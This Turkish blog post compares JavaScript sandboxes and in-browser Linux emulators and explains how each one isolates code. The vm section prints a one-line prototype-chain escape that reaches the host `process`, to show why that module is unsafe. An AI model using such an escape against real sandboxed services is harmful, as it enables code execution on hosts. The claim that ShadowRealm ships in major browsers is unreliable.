---
title: Linux çekirdek simülasyonu için JavaScript çözümlerinin karşılaştırılması
description: JavaScript/TypeScript içinde Linux ortamı canlandırmalarının derinlemesine
  analizi.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "w4d8pAM03SutscxGtdk1CgEhCTO5cp3ESajAZeUOVqZ68V0OcocCFTM5iOVtXOxH30R3k3vdqTq0RGbYICu/5w=="
---

# Her JavaScript sandbox, emülatör, Linux simülatörü ve honeypot, karşılaştırmalı

Tamam, epey süredir bu tavşan deliğinde fazlaca derindeyim. Her şey [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) projesine yardım ettiğim için başladı, Fortune projesi (birazdan dönerim) ve bana sürekli "bekle, `v86` ile farkı ne?" ya da "neden `vm2` kullanmıyorsun?" soruluyordu ve net bir yanıt veremediğimi fark ettim, önce tüm ekosistemi haritalamadan. İşte geldik sanırım.

Dört ayrı aile olduğu ortaya çıkıyor: JS kum havuzları, Linux emülatörleri, Linux simülatörleri ve honeypotlar ve sürekli aynı cümlede anılsalar da neredeyse hiç örtüşmüyorlar. Eklenti sistemi kuran biri `isolated-vm` kullanır. CLI aracı demosu yapan biri `v86` kullanır. SSH tehdit istihbaratı yapan biri Cowrie kullanır. "Kodu bir kutuda çalıştırma" şemsiyesi altında tamamen farklı problemler çözerler.

Bu makaleyi yazmak için kaynak kodu, CVE raporları, mimari belgeleri ve npm sayfaları okuyarak çok zaman geçirdim. Uzun olacak: bir kahve al, cidden. Ya da iki.

> Kısa sorumluluk reddi: `typescript-virtual-container` bu makalede öne çıkar çünkü bu araştırmayı tetikleyen odur. Geri kalan her şeye adil olmaya çalıştım ama bu bağlamı aklında tut.

---

## Kısım 0: Gerçekten hangi problemi çözüyorsun?

Dalmadan önce her ailenin ne işe yaradığı konusunda net olmak değer çünkü terminoloji hızlı bulanıklaşır ve insanlar sürekli her şeyi karıştırır (ben dahil, oturup düzgün haritalamadan önce).

**JS kum havuzları** JavaScript kodunu ana Node.js sürecinden izole eder. Tehdit modeli: `process.exit()` çağırabilecek, dosya okuyabilecek ya da alt süreç başlatabilecek güvenilmez JS kodu. Çözüm V8 yürütme sınırıdır. Bu araçların Linux kabuğu, izinli dosya sistemi ya da SSH kavramı yoktur.

**Linux emülatörleri** JavaScript ya da WebAssembly ile uygulanmış CPU emülatöründe (x86, RISC-V, OR1K) değiştirilmemiş gerçek Linux çekirdeği çalıştırır. Gerçek bir işletim sistemi başlatırsın. Gerçek sistem çağrıların olur. x86 için derlenmiş programlarla ikili uyumluluğun olur. Kaynak maliyeti devasadır.

**Linux simülatörleri** gerçek çekirdek çalıştırmadan Linux sisteminin *davranışını* taklit eder. Bir kabuk yorumlayıcı, bir sanal dosya sistemi ve Unix semantiğinden yeterince uygular, programları ve insanları kandırır. Çekirdek yok, Wasm yok, CPU emülasyonu yok. Çok daha az kaynak.

**Honeypotlar** saldırganları çekip ne yaptıklarını kaydetmek için tasarlanır. Esas olarak yürütme ortamı değildirler: gözlemlenebilirlik araçlarıdır. Gerçek Linux davranışına sadakat yalnızca saldırganın tuzağı tespit etmesini engellediği ölçüde önemlidir.

Bu çerçeveyle bu makaledeki her projenin nereye oturduğu:

```
JS sandbox:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux Emülatörü:  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux Simülatörü: typescript-virtual-container (bu alanda tek)
Honeypot:         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Terminal yığını:  xterm.js + node-pty (izolatör değil ama ilişkili)
```

---

## Kısım 1: JavaScript kum havuzları

### 1.1 `vm`: Node.js yerleşik modülü (sandığın şey değil)

Node içinde "güvenilmez JS çalıştırma" en eski yanıt yerleşik `vm` modülüdür. v0.1den beri vardır, o yüzden birçok insan önce onu kullanır ve yanar.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm` gerçekte ne yapar: yeni bir V8 bağlamı yaratır (yeni bir yerel kurucu kümesi: `Object`, `Array`, `Function` vs.) ve kodu `sandbox` içine koyduğun şeye paylaşılan başvuruyla çalıştırır. V8 motorun değişmez. Sürecin değişmez. Bellek paylaşılır.

`vm`in güvenlik sunmamasının nedeni: JavaScriptin prototip zinciri her şeyi `Object.prototype`a bağlayan DAGdir. Ana dünyadan bir nesne kum havuzuna koyarsan misafir prototip zincirinden yukarı tırmanıp ana kuruculara ulaşabilir. `Function` üzerinden `Function("return process")()` çağırıp gerçek `process`i alabilirsin. Oyun biter. Yani, hemen.

```js
// vm içinde mükemmel çalışır: gerçek processi alırsın
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Yani Node.js belgesinin kendisi der: "vm modülü bir güvenlik mekanizması değildir. Güvenilmez kodu çalıştırmak için kullanmayın." Bu uyarı hep oradadır. İnsanlar sürekli görmezden gelir. `vm`i kum havuzu olarak kullanan üretim uygulamaları gördüm. Lütfen yapma.

**Hüküm**: kapsam mekanizması, kum havuzu değil. Değişkenleri izole etmen gerektiğinde kullan (şablon motorları, kodu kontrol ettiğin `eval` benzeri özellikler). Güvenilmez girdiler için asla.

**Bellek**: ana sürecin aynı V8 yığını: ihmal edilebilir ek yük.
**Güvenlik**: motive saldırgana karşı hiç.

---

### 1.2 `vm2`: topluluk girişimi ve çok uzun ölümü

`vm2`, `vm` kaçış sorununa topluluğun yanıtıydı. Merkez fikir: kum havuzu sınırını geçen her nesneyi özellik erişimlerini kesen, prototip tırmanmayı engelleyen ve tehlikeli başvuruları filtreleyen `Proxy` içine sarmak. Teoride akıllı fikir! Pratikte sonuç çok daha az ikna edici çıktı, göreceğimiz gibi.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMError fırlatır, process erişilemez
```

Birkaç yıl epey iyi işledi. Ama JavaScript `Proxy` saldırı yüzeyi devasadır. JS dilinin her yeni özelliği: üreteçler, asenkron yineleyiciler, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` iç yuvaları, potansiyel atlatma vektörüdür.

CVE kronolojisi... bir şeydir. Şuna bak:

| Tarih | CVE | Mekanizma |
|------|-----|-----------|
| Eki 2022 | CVE-2022-36067 | `Error.prepareStackTrace` üzerinden ana bağlam kaçışı |
| Nis 2023 | CVE-2023-29017 | Yakalanmamış asenkron hatayla ana nesne sızıntısı |
| Nis 2023 | CVE-2023-29199 | `handleException()` ile istisna temizleme atlatması |
| Nis 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| May 2023 | CVE-2023-32314 | `Error.name` üzerinde `Proxy` → `Function` → RCE |
| Tem 2023 | CVE-2023-37466 | Asenkron fonksiyon + yığın taşması + `Proxy.getPrototypeOf` |
| Tem 2023 | CVE-2023-37903 | Worker thread + eval kaçışı |

Aynı ay üç kritik CVE (Nisan 2023). ÜÇ. BİR AYDA. CVE-2023-37903ten sonra bakıcı kütüphaneyi resmen eskitti, mesaj: *"Kütüphane kritik güvenlik sorunları içerir ve üretimde kullanılmamalıdır."*

Bakıcı Ekim 2025te 3.10.0 sürümüyle diriltti, o zaman bilinen her şeyi düzelttiğini iddia etti. Yeni kritik kaçış (CVE-2026-22709, CVSS 9.8) Ocak 2026da açıklandı, ardından Mayıs 2026da on bir tane daha. Desen değişmedi ve dürüstçe asla değişeceğini sanmıyorum.

Temel sorun mimaridir: ve tüm ekosistemin öğrenmesi biraz zaman alan ders budur. İzole ettiğin aynı dille, aynı motorda, aynı süreçte güvenli kum havuzu inşa edemezsin. Kaçış yüzeyi tüm V8 uygulamasıdır: ve V8 sürekli değişen birkaç milyon satır C++tır. Her yeni JS özelliği potansiyel yeni saldırı yolu açar.

**Hüküm**: Güvenliğe duyarlı uygulamalar için kullanma. En güncel sürümde bile birkaç ayda bir yeni atlatmalar keşfedilir. Bakıcının kendisi açıkça kabul etti.

---

### 1.3 `isolated-vm`: gerçekten işe yarayan

`isolated-vm` doğru yaklaşımı benimser: V8in yerel izolasyon ilkeli Isolateu kullanmak. Her V8 Isolateun kendi yığını, kendi çöp toplayıcısı, kendi yerelleri vardır ve diğer Isolatelerle paylaşılan başvuru sıfırdır.

Bu Chromeun sekmeler arası kullandığı sınırın aynısıdır. Dil numarasıyla inşa edilmiş numara değil, gerçek güvenlik sınırıdır.

```js
import ivm from "isolated-vm";

// Her isolate kendi V8 yığınıdır
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB limiti
const context = await isolate.createContext();
const jail = context.global;

// Sınırdan veri geçirmek açık serileştirme gerektirir
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Ana süreci, ana yığını ya da ana modülleri erişemez
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Zaman aşımı ya da bellek limitinde sert sonlandırabilirsin
isolate.dispose(); // tüm yığını serbest bırakır
```

`Reference` ve `ExternalCopy` türleri açık iletişim köprüsüdür. `Reference`, isolatea ana fonksiyona çağrılabilir handle verir: isolate onu çağırabilir ama kapanışını ya da prototipini inceleyemez. `ExternalCopy`, değeri yığın sınırı üzerinden serileştirir (yapısal klon). Bu açık köprü modeli pratik değildir ama izolasyonu gerçek yapan budur.

Sıkı kaynak limitleri tanımlayabilirsin: bellek (aşarsa isolate sonlandırılır), duvar saati zaman aşımı ve CPU zaman aşımı. Sonlandırma gerçektir: tüm V8 Isolateu öldürür, `while(true)` ile atlatılabilecek JS zaman aşımı değil.

**Limitler**: yalnızca JSdir. İçinde bash çalıştıramazsın. Dosya, izin, ağ ya da süreç kavramı yoktur. Kullanıcıca gönderilen JS (eklentiler, formüller, script kancaları) için tam doğru araç ve geri kalan her şey için yanlış araçtır. `typescript-virtual-container` yazarı başında düşündüğünü ama "kabuk komutları çalıştırmak" ile "JavaScript izole etmek"in temelde farklı problemler olduğunu fark ettiğini belirtti.

**Bellek**: boş isolate başına ~3-10 MB, yığın kullanımıyla artar.
**Güvenlik**: sağlam. V8 Isolate sınırı gerçek izolasyon ilkelidir.
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`: Wasme derlenmiş ayrı JS motoru

Farklı bir yaklaşım: V8 içinde izole etmek yerine Wasme derlenmiş tamamen ayrı JavaScript motoru çalıştırmak. Ana V8/Nodeda döner. Misafir Wasm içindeki QuickJSde döner. Kum havuzu Wasm sınırı izolasyon sınırını sağlar.

QuickJS yine Fabrice Bellard eseridir (QEMU, FFmpeg, JSLinux, TinyEMU arkasındaki aynı adam: bu kişi gerçek değil, cidden tek kişi bütün bunları nasıl yapar?). C ile yazılmış ES2023 uyumlu küçük bir JS motorudur ve Wasme derlenince yalnızca ~500 KB tutar.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = await vm.evalCode(`
  // V8den tamamen ayrı QuickJSde çalışır
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS, C ile yazılmış ES2023 uyumlu küçük bir JavaScript motorudur. Wasme derlenince senkron varyant ~500 KB, asenkron varyant (Asyncify) ~1 MB tutar. Bellek yönetimi manüeldir: VMden çıkardığın her değer açık serbest bırakılmalıdır, biraz sıkıcı ama sınır ötesi GC sürprizlerini engeller. Eğlenceli bir takas!

`@sebastianwessel/quickjs` sarmalayıcı üstüne daha ergonomik API ekler, opsiyonel sanal dosya sistemi, fetch desteği ve Node.js modül saplamalarıyla:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Güvenlik modeli `isolated-vm`den farklıdır: Wasm doğrusal bellek modeli misafirin V8 yığın nesnelerine doğrudan erişemeyeceği anlamına gelir. Saldırı yüzeyi ana↔Wasm arayüzüdür (içe/dışa aktarmalar), tüm JS dili değil. Genelde Proxy tabanlı kum havuzlarından daha sağlam sayılır.

Tersi: QuickJS V8 düzeyinde optimize değildir. JS CPU yoğun yüklerde V8den 5 ila 20 kat yavaştır. Küçük kod parçaları ve güvenilmez değerlendirmeler için genelde önemli değildir.

**Bellek**: ~500 KB Wasm modülü + örnek başına yığın.
**Güvenlik**: Wasm sınırı, Proxy tabanlı yaklaşımlardan daha sağlam sayılır.
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno: izinleri önceleyen runtime

Deno tamamen farklı felsefe benimser: Nodeda kum havuzu yapmak yerine varsayılan güvenli yeni runtime inşa etmek. Bu yaklaşımı gerçekten severim: Node.jsin başından beri olması gereken budur, dürüstçe. Ryan Dahl (orijinal Node.js yaratıcısı) Node.jsin bazı tasarım kararlarından pişman olduğu için Deno yu kelimenin tam anlamıyla yarattı, düşününce epey çılgınca.

Her hassas yetenek (dosya okuma, dosya yazma, ağ, ortam, alt süreç) açık `--allow-*` bayrağı gerektirir:

```bash
# Bu yalnızca /data içinde okuyabilir, başka hiçbir şey
deno run --allow-read=/data script.ts

# Bu yalnızca tek alana erişebilir
deno run --allow-net=api.example.com script.ts

# Bayrak yok = izin yok
deno run untrusted.ts # okuyamaz, yazamaz, ağ yok, çalıştırma yok
```

İzin modeli Rust/OS seviyesinde uygulanır: JS numarası değildir. Deno kodu `Deno.readFile()` çağırınca dosya sistemine dokunmadan önce izin tablosunu kontrol eden Rust işleminden geçer. JSden atlatamazsın çünkü izin verilmezse sistem çağrısı hiç olmaz.

Gerçekten güvenilmez kod çalıştırmak için Deno Workerlar (Web Workerlar) aynı süreçte ikinci isolate sağlar, her birinin kendi izin kümesi vardır. Sıfır izinli worker çalıştırıp onunla `postMessage` üzerinden iletişim kurabilirsin.

Ekim 2024te çıkan Deno 2 tam npm uyumluluğu ve Node.js uyumluluk shimleri ekledi, sunucu tarafı kullanım için benimsenmesini önemli iyileştirdi.

**Takas**: Deno güvenlik modeli kısmen güvenebileceğin kod için mükemmeldir. Düşmanca olabilecek tamamen güvenilmez kod için izin modeli yardım etmez: Isolate sınırına (`isolated-vm`) ya da farklı motora (`quickjs-emscripten`) ihtiyacın vardır çünkü Deno yine V8 kullanır ve sofistike saldırganlar V8 seviyesi hatalar bulabilir.

---

### 1.6 TC39 ShadowRealm: standart yanıt (bir gün)

JavaScript standart kuruluşunun (TC39) `vm` ve `vm2`nin yapmaya çalıştığını ama doğru güvenlik modeliyle standartlaştırmaya çalışan bir önerisi vardır: ShadowRealm. ShadowRealm kendi içselleriyle izole JS yürütme bağlamı yaratır, dış dünyaya erişim yok ve dikkatle kontrol edilmiş içe/dışa aktarma arayüzü.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Ayrı içseller, dış dünyaya erişim yok
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm tarayıcılarda mevcuttur (Chrome 90+, Firefox 105+) ama 2026da henüz kararlı Node.js içinde değildir. TC39 Compartments önerisi modül seviyesi izolasyon için üstüne inşa edilir. Bunlar uzun vadeli standart yanıtlardır ama Node sunucu tarafı üretim için hazır değildir. Uzaktan geldiğini gördüğün ama... henüz orada olmayan işlerden. Klasik TC39.

---

### Kum havuzu ailesinin özeti

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **İzolasyon sınırı** | yok (kapsam) | Proxy (kırık) | V8 Isolate | Wasm | V8 Isolate + Rust izinleri |
| **Bellek limiti** | ❌ | ❌ | ✅ sıkı limit | ✅ Wasm yığını | kısmi |
| **CPU zaman aşımı** | ❌ | ✅ (atlatılabilir) | ✅ sıkı | ✅ | ✅ |
| **Güvenlik** | hiç | kırık | sağlam | sağlam | sağlam |
| **JS hızı** | yerel V8 | yerel V8 | yerel V8 | ~10x yavaş | yerel V8 |
| **Tarayıcı** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node uyumluluğu** | yerel | ✅ | ✅ | kısmi shimler | kısmi |
| **Durum** | kararlı | riskli (yeni CVEler) | ✅ aktif | ✅ aktif | ✅ aktif |
| **RAM ek yükü** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

Hüküm: güvenlik önemliyse tam iki gerçek seçenek vardır: `isolated-vm` (yerel uzantı, V8 Isolate, tam JS hızı) ve `quickjs-emscripten` (Wasm, tarayıcı uyumlu, yoğun hesapta ~10x yavaş). Geri kalan ya "lütfen yapma" (`vm`, `vm2`) ya tamamen farklı problemi çözen runtime (Deno)dır. ShadowRealm bir gün oyunu değiştirebilir ama henüz değil.

---

## Kısım 2: JavaScript içinde Linux emülatörleri

Burası benim için işlerin gerçekten ilginçleştiği yer. Bunlar *gerçek* emülatörlerdir: CPU komut kümesini JavaScript ya da WebAssembly ile uygular, gerçek Linux çekirdek imajı başlatır ve gerçek kullanıcı alanı ikilileri çalıştırır. İzolasyon misafir ve ananın hiçbir şeyi paylaşmamasından gelir: farklı bellek alanları, farklı komut akışları.

Fiyatı devasadır ama elde ettiğin gerçekten kayda değerdir: gerçekten Linux, gerçekten döner, tarayıcında ya da Node sürecinde. Yani düşününce epey çılgınca, değil mi?

### 2.1 `v86`: JS + Wasm JITli x86 PC emülatörü

Fabrice imzasıyla `v86` (GitHubda copy) JavaScriptteki en yetenekli açık kaynak x86 emülatörüdür. 2013 civarı saf JS yorumlayıcı başladı ve x86 temel bloklarının anında WebAssemblye çevrildiği JIT sistemine evrildi, performansı önemli artırdı.

Öykündüğü şeyler:
- **CPU**: x86-32 (IA-32), Pentium 1 seviyesi komut kümesi. 64-bit (x86-64) hariçtir: bu donanımsal mimari limittir, eksik özellik değil.
- **FPU**: JavaScript `Float64Array` üzerinden. x87 80-bit geniş hassasiyettir; JS doubleları 64-bittir. Yani kayan nokta sonuçları gerçek CPUdan hafif farklı olabilir.
- **Bellek**: yapılandırılabilir, JS yığınında `SharedArrayBuffer` ya da `ArrayBuffer`a eşlenir.
- **Donanım**: 8254 PIT (zamanlayıcı), 8259 PIC (kesme denetleyici), 8042 klavye denetleyici (PS/2), CMOS RTC, SVGA ve Bochs VBE uzantılı VGA, IDE denetleyici, disket denetleyici (8272A), NE2000 ağ kartı.
- **BIOS**: SeaBIOS (açık kaynak x86 BIOS) kullanır.

JIT, temel blokları (dalsız x86 komut dizileri) tanımlayıp WebAssembly fonksiyonuna çevirip önbelleğe alıp sonraki yürütmelerde aynı bloğu çağırarak çalışır. Sıcak kod yolları yerel Wasm performansı alır. Soğuk yollar JS yorumlayıcıya düşer.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Seri çıktıyı yakala (Linux çekirdek konsolu)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Misafire girdi gönder (kabuğa yaz)
emulator.serial0_send("ls /\n");
```

**Desteklenen işletim sistemleri**: Alpine Linux (mükemmel), Ubuntu 16.04/18.04 (yalnızca i386), 32-bit Arch Linux, ReactOS, FreeDOS, Windows 9x/2000 (çekincelerle), MS-DOS.

**Başlatma süresi**: temiz imajdan Alpine Linux için 15-40 saniye. Bu gerçek çekirdek başlatmaya içkindir: atlayamazsın. Evet, kullanıcıların tarayıcılarında Linux çekirdeği başlatmasını izleyecek. Anlaşma bu.

**Minimum bellek**: örnek başına 100-256 MB. Yalnızca Wasm JIT kod önbelleği meşgul Linux örneği için onlarca MBa ulaşabilir.

**Node.js içinde kullanım**: tam desteklenir. Yalnızca seri çıktıyla ilgileniyorsan VGA çıktısı yoksayılabilir: DOM gereksiz kalır.

**Yapamayacağın şeyler**: 64-bit ikililer çalıştırmak, modern çekirdek özellikleri (eBPF, io_uring vs.) kullanmak ya da bellek limitlerine ulaşmadan aynı anda bir avuçtan fazla örnek çalıştırmak.

**npm**: [v86](https://www.npmjs.com/package/v86): sürekli güncellenir, yazarken son yayın aynı gün.
**GitHub**: [copy/v86](https://github.com/copy/v86)
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux ve TinyEMU: Bellard işi, iki seferde

JSLinux, Fabrice Bellardın JavaScript içinde kendi Linux emülatörüdür: ilki, 2011de yayınlandı. Bu makalede Bellardı anmaya devam ederim çünkü belirmeye devam eder: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Bu adam başka bir şeydir. Abartısız yazılım tarihinin en etkileyici bireysel teknik katkılarından biri. Gerçekten.

Orijinal JSLinux saf JS x86 yorumlayıcıydı. 2016da Bellard TinyEMuyu yazdı (C ile RISC-V emülatörü), Emscripten ile JavaScript derledi ve bu mevcut JSLinuxun tabanı oldu. Yani mevcut JSLinux aslında JavaScript üreten C kodudur: elle yazılmış JS hiç değildir.

Bellard sitesindeki teknik notlar okumaya değer: mevcut JSLinux 32 ya da 64-bit RISC-V CPU (x86 değil) çalıştırır, VirtIO konsol, VirtIO ağ, VirtIO blok cihazı ve ana ile dosya paylaşımı için 9P dosya sistemi öykünür. JS demosu Emscripten kullanılarak Cden derlenir: elle yazılmış JS değildir.

TinyEMUnun kendisi şunları destekler:
- RISC-V RV32IMAFDQC ve RV64IMAFDQC (32 ve 64-bit, kayan nokta, çarpma, sıkıştırılmış komutlarla)
- KVM üzerinden x86 (yalnızca yerel, emülasyon yok: yani JS sürümü yalnızca RISC-Vdir)
- VirtIO konsol, ağ, blok, girdi, 9P dosya sistemi

TinyEMUnun Emscripten ile sağlanan JavaScript demosu vardır. Bu JSLinuxun tabanıdır ve `container2wasm` tarafından da kullanılır (bölüm 2.5e bak).

**JSLinux durumu**: npm paketi yok, programlanabilir API yok. Tarayıcıda açtığın bir demodur. Tarihsel önemi büyüktür: kavramı kanıtladı. Kütüphane olarak pratik fayda: sıfır.

**TinyEMU**: npmde yok, C kaynağı [bellard.org/tinyemu](https://bellard.org/tinyemu/) adresinde mevcuttur.

---

### 2.3 jor1k: OR1K emülatörü

jor1k, Sebastian Macke tarafından JavaScript yazılmış OpenRISC 1000 (OR1K) emülatörüdür. Tarihsel ilginçtir çünkü jor1k VirtIO 9P dosya sistemi desteğini getirdi, Bellard sonra TinyEMU ve JSLinuxa entegre etti. Bu projeler arası çapraz tozlaşma sıkıdır: hepsi birbirinden fikir ödünç alır, dürüstçe açık kaynak öykünme işinin en havalı şeylerinden biridir.

**Durum**: artık aktif bakımlı değil, npm paketi yok. Bu aşamada arşivlenmiş. Esas tarihsel bağlam için bilinmeye değer: türü sohbette biri jor1k anarsa artık ne olduğunu bilirsin :)

---

### 2.4 CheerpX: tarayıcı için ticari x86 emülatörü

Leaning Technologies imzalı CheerpX üretim kalitesinde ticari Linux x86 emülatörüdür. Açık kaynak değildir ama gerçek Debian/Ubuntu kullanıcı alanını çalıştırmak için v86dan belirgin yeteneklidir. Tarayıcıda gerçek VSCodea ihtiyacın varsa ihtiyacın olan budur.

v86dan kilit farklar:
- Daha geniş ISA desteği (daha fazla x86 uzantısı, daha iyi glibc uyumluluğu)
- Tarayıcıda IndexedDB tabanlı dosya sistemi (sayfa yeniden yüklemelerinde kalıcı)
- `SharedArrayBuffer` üzerinden pthread desteği (COOP/COEP başlıkları gerektirir: evet o sinir bozucu güvenlik başlıkları)
- VSCode, Python, Node.js ve diğer gerçek uygulamaları çalıştırmak için tasarlanmış: minimal işletim sistemi imajları değil
- Profesyonel destek ve SLA mevcut (aka bozulursa birine çıkışabilirsin)

Tipik kullanım durumu "sunucusuz tarayıcıda gerçek Linux uygulaması çalıştırmak"tır. Şirketler tarayıcı tabanlı IDEler, kodlama öğreticileri ve etkileşimli belgeleme için kullanır.

```js
// CheerpX API (basitleştirilmiş)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js hikâyesi**: CheerpX önce tarayıcı için tasarlanmıştır. Alttaki emülatör teoride Nodeda çalışabilir (Wasm) ama API ve belgeler tamamen tarayıcı kullanımına yöneliktir. Sunucu tarafı kullanım desteklenmez.

**Bellek**: v86 benzeri: gerçek Debian örneği için 200+ MB.
**Fiyatlandırma**: açık kaynak projeler ücretsiz, üretim SaaS için ticari lisans.
**Belgeler**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz): Wasmde Node.js, Linux öykünmesi değil

WebContainerlar sık Linux emülatörleriyle aynı torbaya konur ama mimari farklıdır. x86 öykünmezler. Linux başlatmazlar. WASI kullanarak WebAssemblye derlenmiş Node.js çalıştırırlar. Bu ayrım çok önemlidir ve kafamın karışık olmasıyla fazlaca zaman harcadım.

Karışıklığın pazarlamadan geldiğini düşünürüm: "tarayıcında Node.js çalıştır" öykünme gibi duyulur ama aslında Wasme derlenmiş Node.jsin kendisidir, VM içinde Node.js çalıştıran Linux öykünmesi değil. İki tamamen farklı mimari.

Mimari:
1. Node.js Wasme derlenir (özel WASI çalışma ortamı)
2. Service Worker öykünmüş Node.js sunucusunun ağ isteklerini keser ve tarayıcı sekmesine yönlendirir
3. Dosya sistemi tarayıcı belleğinde yaşar (disk G/Ç yok)
4. npm tarayıcı içi kullanıma optimize özel uygulamadır

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Dosya yaz
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js komutları çalıştır
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Gerçek Node.js çalıştırdığı için (Wasme derlenmiş) gerçek npm, gerçek Node.js APIleri ve gerçek modül çözümlemesi elde edersin. Genel Linux kullanıcı alanı elde etmezsin: `apt` ile sistem paketi kuramaz, keyfi derlenmiş ikililer çalıştıramaz ya da Node.js ekosistemi dışında fazla şey yapamazsın.

**Tarayıcı önkoşulları**: SharedArrayBuffer (COOP/COEP başlıkları gerektirir), Service Worker desteği, modern Wasm.

**Node.js hikâyesi**: yalnızca tarayıcı kullanımı için tasarlanmış. API tarayıcı bağlamı dışında çalışmaz.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Belgeler**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm: Wasme derlenmiş Docker konteynerleri

`container2wasm`, NTTnin Docker konteyner imajını alıp tarayıcı dahil herhangi bir Wasm anada dönebilen WebAssembly ikilisine dönüştüren aracıdır (npm paketi değil). İlk gördüğümde gerçekten çalıştığına inanmadım.

Mekanizma:
- x86_64 konteynerler için: Bochs (Wasme derlenmiş x86 emülatörü) + konteynerin kök dosya sistemi gömülür
- riscv64 konteynerler için: TinyEMU (yine Bellard!) + konteynerin kök dosya sistemi gömülür
- Sonuç `.wasm` dosyası emülatörü başlatır, konteynerin dosya sistemini bağlar ve konteynerin giriş noktasını çalıştırır

```bash
# Ubuntu 22.04 konteynerini Wasme dönüştür
c2w ubuntu:22.04 out.wasm

# Çalıştır
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Ya da tarayıcı kullanımı için sun
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Sonuç `.wasm` hacimlidir: minimal Ubuntu birkaç yüz MB tutar ama tamamen bağımsızdır. Birine e-postayla `.wasm` gönderip tarayıcısında Ubuntu çalıştırabilir. Bu cümlenin anlamlı olmaması gerekirdi ama işte buradayız.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Emülatör ailesinin özeti

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Mimari** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (sahipli) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Gerçek çekirdek** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | uygulanamaz | ✅ |
| **npm paketi** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI aracı) |
| **Node.js kullanımı** | ✅ | ❌ | ❌ | ❌ | ❌ (yalnızca tarayıcı) | Wasmtime üzerinden |
| **Tarayıcı kullanımı** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/örnek** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
